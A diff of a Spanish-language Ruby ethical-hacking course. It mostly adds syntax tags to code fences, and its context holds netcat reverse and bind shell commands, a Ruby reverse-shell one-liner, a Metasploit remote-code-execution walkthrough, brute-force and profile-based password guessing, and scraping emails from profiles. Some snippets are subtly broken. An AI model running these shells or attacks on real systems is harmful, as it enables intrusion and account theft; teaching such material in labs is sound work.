@@ -13,7 +13,7 @@ Nota: ¿Alguna vez has tenido un problema con tu computadora y tras una revisió
 - sub: nos cambia el primero parámetro que encuentra y que necesitemos cambiar.
 - gsub: nos ayuda a generar un cambio con el parámetro que le pasemos de manera global, ej:
 
-```
+```rb
 !/usr/bin/env ruby
 
 frase = "hay un lugar llamado San Cristobal"
@@ -33,7 +33,7 @@ saludo = saludo.sub(/^./,"REEMPLAZA")
 
 Entonces:
 
-```
+```rb
 saludo = "hola soy Ana"
 #saludo = saludo.sub(/REGEX/,"REEMPLAZA")
 saludo = saludo.sub(/^./,"REEMPLAZA")
@@ -50,7 +50,7 @@ Nos devuelve:
 Esto va a imprimir de 3 caracteres a la vez, y si no encuentra 3 caraceres mo lo imprime.
 
 
-```
+```rb
 respuesta = "Este es un Curso de hacking"
 respuesta = respuesta.scan(/.../){|i| puts i}
 
@@ -58,7 +58,7 @@ respuesta = respuesta.scan(/.../){|i| puts i}
 
 Nos imprime los caracteres que encontró en base a cada 3 caracteres.
 
-```
+```shell
 Est
 e e
 s u
@@ -77,7 +77,7 @@ Esto va a tomar cualquier valor, menos los espacios, inclusive elimina los carac
 
 Nos devuelve en consola:
 
-```
+```shell
 Est
 Cur
 hac
@@ -89,14 +89,14 @@ kin
 
 Ejemplo: 
 
-```
+```rb
 curso = "Ahora tenemos otracadena de texto con 1005 numeros"
 curso.scan(/\d/){|i| puts i}
 ```
 
 ***Responde asi:***
 
-```
+```shell
 1
 0
 0
@@ -107,7 +107,7 @@ curso.scan(/\d/){|i| puts i}
 
 Imprimir solo los caracteres especificos:
 
-```
+```rb
 curso = "Ahora tenemos otra cadena de texto con 1005 numeros"
 
 curso.scan(/[eoa]/){|i| puts i}
@@ -115,7 +115,7 @@ curso.scan(/[eoa]/){|i| puts i}
 
 Nos retorna todas las letras que especificamos en el parámetro:
 
-```
+```shell
 o
 a
 e
@@ -136,13 +136,15 @@ o
 
 Seleccionar por bloque de caracteres:
 
-```
+```rb
 curso = "Ahora tenemos otra cadena de texto con 1005 numeros"
 
 curso.scan(/[a-m]/){|i| puts i}
+```
 
 Respuesta:
 
+```shell
 h
 a
 e
@@ -202,7 +204,7 @@ Crearemos todas nuestras dependencias en la máquina virtual VM, crear el servid
 
 - Generalmente `webrick` viene por defecto, sino debemos instalarlo con: `gem install webrick`.
 
-```
+```rb
 # !/usr/bin/env ruby
 
 require 'webrick'
@@ -213,7 +215,7 @@ require 'webrick'
     - Debemos darle un Puerto.
       - El path, representa la dirección.
 
-```
+```rb
 path = File.expand_path('/home/kali/Escritorio/ethical-hacking-ruby')
 server = WEBrick::HTTPServer.new : Port => 8000, :DocumentRoot => path
 ```
@@ -244,7 +246,7 @@ Ejecutar en terminal:
 > Los scanners de puertos(o de redes) tienen la funcionalidad de detectar puertos abiertos o cerrados sobre un host.
   - Teniendo la información del status de los puertos  podemos darnos una idea del servicio que se esta corriendo sobre este.
 
-```
+```rb
 require 'socket'
 
 PORT = ARGV[0] || 80
@@ -258,7 +260,6 @@ rescue Errno::ECONNREFUSED, Errno::ETIMEDOUT
 end
 
 puts "Puerto: #{PORT} esta #{status}"
-
 ```
 
 - connect_nonblock: con socket, vamos a hacer que se ejecute la conexión de manera asincrona.
@@ -321,11 +322,11 @@ Sirve para ocultar la identidad en Internet utilizando un sistema operativo basa
 > El web scraping se realiza utilizando programas llamados bot, spider o crawler, por eso es habitual que muchas páginas web utilizan métodos de defensa ante este tipo de navegación (introducción de captchas, casilla de verificación de “no soy un robot”, y similares).
 
 
-- $ gem install nokogiri
+- `$ gem install nokogiri`
 
 Entonces; nokogiri hace que sea fácil y sencillo trabajar con XML y HTML de Ruby.
 
-- $ gem install httparty
+- `$ gem install httparty`
 
 Nos ayudará a generar peticiones de tipo XML o HTML.
 
@@ -334,7 +335,7 @@ Esto nos devolverá el primero valor que encuentra en el `div`: `job_listings = 
 
 Devolver el valor por página:
 
-```
+```rb
 require 'nokogiri'
 require 'httparty'
 
@@ -359,14 +360,13 @@ scrapper
 
 Vamos a conseguir todos los valores numéricos en la pág.
 
-```
+```rb
   total = total-scan(/\d+/){ |i| array.push(i.to_i) }
-
 ```
 
 Acceder al último valor:
 
-```
+```rb
   total = total-scan(/\d+/){ |i| array.push(i.to_i) }
   total = array[-1]
   puts total
@@ -377,7 +377,7 @@ Acceder al último valor:
 Este ciclo nos devolverá la cantidad  de páginas que exista como opciones:
 
 
-```
+```rb
 while page <= 1 last_page
     puts "Page: #{page}"
     pagination_url = "https://..."
@@ -393,7 +393,7 @@ Este web scrapping, esta preparado solo para esta página de trabajos en particu
 Esto nos devolverá la paginación y su contenido en cada una de ellas:
 
 
-```
+```rb
     pagination_unparsed_page = HTTParty.get(pagination_url)
     pagination_parsed_page = Nokogiri::HTML(pagination_unparsed_page.body)
     pagination_job_listings = pagination_parsed_page.css('div.iO')
@@ -406,7 +406,7 @@ Esto nos devolverá la paginación y su contenido en cada una de ellas:
 
 Esto nos ayudará a retornar la variable con sus contenidos y además nos devolverá:
 
-```
+```rb
 def scrapper_company(jobs_listing)
   job_listing.css('span[itemprop="name"]').each do |link|
     nuevo = link.content
@@ -422,7 +422,7 @@ end
 Al llamar a job con `puts job`, nos debiera traer las listas de tituloa, empresas, y la dirección de url:
 
 
-```
+```rb
 job = {
         title: job_listing.css('h2.tO').text,
         company: bussines,
@@ -433,7 +433,7 @@ job = {
 Devolver el valor de la url, accediendo al ancla de la url, mediante el `href`:
 
 
-```
+```rb
       job = {
         title: jobs_listing.css('h2.tO').text,
         company: bussines,
@@ -444,7 +444,7 @@ Devolver el valor de la url, accediendo al ancla de la url, mediante el `href`:
 
 O podriamos recorrerlo e interpolarlo:
 
-```
+```rb
 job.each do |k, v|
   puts "#{k} => #{v}"
 end
@@ -466,7 +466,7 @@ Si no tenemos instalado net-http, lo instalaremos con `gem install net-http`. Si
 Obtener encabezados de respuesta con `x-powered-by`:
 
 
-```
+```rb
 require 'net/http'
 
 def detectar(host, puerto)
@@ -500,14 +500,14 @@ Ejemplos:
 
 1.- string text:
 
-```
+```rb
 string text = "x=3.452 y=4521 z= 3412";  
 string[] results = text.ExtractStringsUsingRegex(@"\d+(?:\.\d+)?");
 ```
 
 2.- text:
 
-```
+```rb
 text = "To contact send an email to test@acme.com. If you don't get " + 
     "a quick response , please send an e- mail  answers@acme.com.br."; 
 results = text.ExtractStringsUsingRegex("[_A-Za-z0-9-\\+]+(\\.[_A-Za-z0-9-]+)*@[A-Za-z0-9-]+(\\.[A-Za-z0-9]+)*(\\.[A-Za-z]{2,})"); 
@@ -516,7 +516,7 @@ results = text.ExtractStringsUsingRegex("[_A-Za-z0-9-\\+]+(\\.[_A-Za-z0-9-]+)*@[
 3.- Los métodos IsValidEmail y DomainMapper pueden estar incluidos en una biblioteca de métodos de la utilidad de expresiones regulares o pueden incluirse como métodos estáticos o de instancia privados en la clase de aplicación.
 
 
-```
+```rb
 Expresión Regular para IsValidEmail: ^(?(“)(“.+?(?<!\\)”@)|(([0-9a-z]((\.(?!\.))|[-!#\$%&’\*\+/=\?\^`\{\}\|~\w])*)(?<=[0-9a-z])@))”(?(\[)(\[(\d{1,3}\.){3}\d{1,3}\])|(([0-9a-z][-\w]*[0-9a-z]*\.)+[a-z0-9][\-a-z0-9]{0,22}[a-z0-9]))$
 ```
 
@@ -534,7 +534,7 @@ Esto buscará del cero al nueve y de la letra `a` a la letra `f`: `/(?:[0-9A-F][
   - ***Advertencia: este mac es sacado de internet, por tanto no pertenece a ningún dispositivo existente.***
     - Nos ayuda a buscar mac que esten ocultas dentro de las páginas web.
 
-```
+```rb
 mac = "ads fs:ad fa:fs:fe: Wind00-0C-29-38-1D-61ows 00-80-41-AE-FD-7E"
 mac_regex = /(?:[0-9A-F][0-9A-F][:\-]){5}[0-9A-F][0-9A-F]/i
 mac = mac.scan mac_regex
@@ -548,7 +548,7 @@ En esta ocasión buscaremos la ip de un pc en particular, pero tendremos los val
 
 ***Advertencia: Las ip registradas en esta documentación no son reales, son de carácter de pruebas.***
 
-```
+```rb
 ip = "ads fs:ad fa:fs:fe: Wind10.0.4.5ows 11192.168.0.15dsfsad fas fa1 20.555.1.700 f2"
 ipv4_regex = /(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)/
 ip = ip.scan ipv4_regex
@@ -563,7 +563,7 @@ end
 Para este ejemplo se utilizaron url no existentes, pero queda en claro el efecto de búsqueda el cual nos ayudará encontrar ciertas url, ya sean con `http` o `https`. Para la instalación de la gema: `gem install net-http`.
 
 
-```
+```rb
 require 'uri'
 string = "text here http://algo.algo.org/algo2 and http://dos.ejemplo.org/algo3"
 string.scan(/https?:\/\/[\S]+/)
@@ -574,19 +574,19 @@ puts URI.extract(string, ["http", "https"])
 
 1.-
 
-```
+```rb
 (/http|ftp|https)://([\w_-]+(?:(?:\.[\w_-]+)+))([\w.,@?^=%&:/~+#-]*[\w@?^=%&/~+#-]/)?
 ```
 
 2.- 
 
-```
+```rb
 /(?:(?:https?|ftp|file):\/\/|www\.|ftp\.)(?:\([-A-Z0-9+&@#\/%=~_|$?!:,.]*\)|[-A-Z0-9+&@#\/%=~_|$?!:,.])*(?:\([-A-Z0-9+&@#\/%=~_|$?!:,.]*\)|[A-Z0-9+&@#\/%=~_|$])/igm
 ```
 
 3.-
 
-```
+```rb
 /(http|https)\:\/\/[a-zA-Z0-9\-\.]+\.[a-zA-Z]{2,3}(\/\S*)?/
 ```
 
@@ -597,7 +597,7 @@ puts URI.extract(string, ["http", "https"])
 Nos devuelve los links que se encuentran dentro del Perfil de esta persona, en una página específica:
 
 
-```
+```rb
 require 'net/http'
 puts Net::HTTP.get(URI.parse("https://twitter.com/algo")).scan(/https?:\/\/[\S]+/)
 
@@ -608,7 +608,7 @@ puts Net::HTTP.get(URI.parse("https://twitter.com/algo")).scan(/https?:\/\/[\S]+
 
 .uniq: nos ayuda en la búsqueda única de un valor específico.
 
-```
+```rb
 require 'net-http'
 email_regex = /\b[A-A0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,4}\b/i
 puts Net::HTTP.get(URI.parse("https://twitter.com/algomas")).scan(email_regex).uniq
@@ -632,7 +632,7 @@ Vamos a utilizar la gem o librería `digest`. Una función hash criptográfica e
 
 Por ejemplo, si tuviera la palabra `Hola`, y quisiera cifrarla, lo hariamos así:
 
-```
+```rb
 require 'digest'
 
 palabra = "Hola"
@@ -655,7 +655,7 @@ MD5 viene del inglés "Message Digest Algorithm 5". Fue creado en 1991 por Ronal
 Esto nos ayuda a evaluar si la integridad del un archivo sigue siendo la misma, ya que cualquier cambio realizado en este, podrá alterar el cifrado del mismo.
 
 
-```
+```rb
 require 'digest'
 
 palabra = "Hola"
@@ -671,7 +671,7 @@ Una de la ventajas de cifrar nuestras contraseñas, datos, contenido, etc. es qu
 NTLMv1 y NTLMv2: es como se guardan los hashes actualmente en windows.
 
 
-```
+```rb
 # NTLMv1
 require 'digest'
 require 'openssl'
@@ -691,14 +691,14 @@ puts ntlmv2
 
 
 
-```
+```rb
 # mysql
 puts "*" + Digest::SHA1.hexdigest(Digest::SHA1.hexdigest('password')).upcase
 ```
 
 Sería lo mismo que decir:
 
-```
+```rb
 #mysql...seria lo mismo que:
 sha1_mysql_1 = Digest::SHA1.hexdigest('password')
 puts sha1_mysql_1
@@ -719,7 +719,7 @@ En el caso de que sepas que los caracteres son números o letras, tendrías la o
 
 La más utilizada, creas una lista de palabras, y esta lista se le conoce como diccionario. Podríamos tener algo asi:
 
-```
+```shell
   - password
   - contraseña
   - 12345678
@@ -731,7 +731,7 @@ Esto seria como un top de palabras más utilizadas para contraseñas sencillas, 
 
 CASO: Podríamos tener a un individuo que quisieramos descifrar su password de una red social, tendriamos:
 
-``` 
+```shell
  - edad         - nombre de los hijos
  - ciudad       - nombre de la esposa
  - teléfono     - fecha de nacimiento de todos
@@ -785,13 +785,13 @@ Lo que haremos en el equipo comprometido sera ejecutar el siguiente comando:
 
 Victima: Conexión externa.
 
-```
+```rb
 nc -nv
 ```
 
 Atacante: Escucha sobre TCP
 
-```
+```rb
 nc -lvp
 ```
 
@@ -802,13 +802,13 @@ nc -lvp
 
  Atacante: A la espera de la conexión.
 
-```
+```shell
 nc -lvp (Puerto)
 ```
 
 Victima: Se esta dando el valor de cmd.exe para indicar la Shell con la que se llegara a interactuar.
 
-```
+```shell
 nc -nv (Direccion ip) (Puerto) -e cmd.exe
 ```
 
@@ -817,13 +817,13 @@ Reverse Shell en Linux:
 
 Atacante:
 
-```
+```shell
 nc .lvp (puerto)
 ```
 
 Victima:
 
-```
+```shell
 nc -nv  (Direccion ip) (Puerto)  -e /bin/(Tipo de Shell a dar)
 ```
 
@@ -834,14 +834,14 @@ En este caso con la Bind Shell lo que hacemos es realizar la conexión al equipo
 
 Victima:
 
-```
+```shell
 nc -lvp (Puerto) -e cmd.exe
 ```
 
 
 Atacante:
 
-```
+```shell
 nc -nv (Direccion ip)(Puerto)
 ```
 
@@ -850,14 +850,14 @@ Bind Shell en Linux:
 
 Victima:
 
-```
+```shell
 nc -lvp (Puerto) -e /bin/sh
 ```
 
 
 Atacante:
 
-```
+```shell
 nc -nv (Direccion ip)(Puerto)
 ```
 
@@ -870,7 +870,7 @@ En una proxima entrada de Hacking 101 mencionaremos como obtener diferentes Shel
 
 Para realizar este ataque, debemosconocer la IP de la víctima.
 
-```
+```rb
 require 'socket'
 
 s = TCPSocket.new("192.168.109.129",9876)
@@ -910,7 +910,7 @@ Primero debo estar en modo escucha: `$ nc -lvp 9876`.
 
 Luego:
 
-```
+```rb
 ~$ ruby rsocket -c's = TCPSocket.open("ip", 9876).to_i:exec sprintC("/bin/sh -i <%d >&%d 2>&%d", algo)'
 ```
 
@@ -950,7 +950,7 @@ Lo ejecuto en metasploit con: `ruby metasploit.rb`
 
 En kali: 
 
-```
+```shell
 $ sudo msfconsole
 [sudo] password for kali:
 [vaquita feliz]
@@ -967,19 +967,22 @@ Matching Modules
 ...
 
 
-
-
+```shell
 msf5 > use 0
+```
 
 o también:
 
+```shell
 msf5 > use exploit/linux/misc/drb_remote_codeexec
 [*] Using config...
 
 msf5 exploit(exploit/linux/misc/drb_remote_codeexec) > show options
+```
 
 # rellenar campos:
 
+```shell
 Name   Current Setting  Required  Description
 ----   ---------------  --------  -----------
 RHOST                      no      The...
@@ -989,7 +992,7 @@ URI                        no      The URI of the target host (druby://host:port
 
 Completamos la URI:
 
-```
+```shell
 msf5 exploit(exploit/linux/misc/drb_remote_codeexec) > set URI druby://192.168...:8080
 
 URI => druby://192.168...:8080
@@ -998,20 +1001,20 @@ URI => druby://192.168...:8080
 
 Nos mostrará las opciones existentes y debemos llamar a exploit:
 
-```
+```shell
 msf5 exploit(exploit/linux/misc/drb_remote_codeexec) > show options
 ```
 
 Llamamos a exploit y esperamos a que se ejecute:
 
-```
+```shell
 msf5 exploit(exploit/linux/misc/drb_remote_codeexec) > exploit
 ```
 
 
 Ya tenemos la conexión lista con la víctima, asi que podemos ejecutar comandos como:
 
-```
+```shell
 hostname
 => metasploitable
 ls
@@ -1050,7 +1053,7 @@ Y así es como se crea un ataque de fuerza bruta con Ruby (⊃｡•́‿•̀�
 
 Debieras ver algo como:
 
-```
+```shell
 Wrong Password: 192... | admin:toor
 Wrong Password: 192... | admin:123456
 Wrong Password: 192... | admin:admin
@@ -1081,7 +1084,7 @@ Nmap puede ser utilizado para monitorear hosts individuales así como redes exte
 
 2.- Una vez creado el archivo .rb, lo ejecuto en la terminal con `ruby nmap.rb`, debiera aparecer algo como:
 
-```
+```shell
 PORT      STATE     SERVICE
 21/tcp    open      ftp
 22/tcp    open      ssh
@@ -1099,7 +1102,7 @@ Ahora antes de cualquier acción, realiza un discover y revisa si el equipo se e
 
 Ahora crearemos un escaneo de sincronización:
 
-```
+```rb
 require 'nmap/program'
 
 Nmap::Program.scan do |nmap|
@@ -1172,7 +1175,7 @@ Si ejecutamos: `msf5 exploit(msf) > exploit`
 
 ***Nos devuelve:***
 
-```
+```shell
 [*] Exploiting target 0.0.0.1
 
 [*] Started reverse TCP handler on 102...:4444
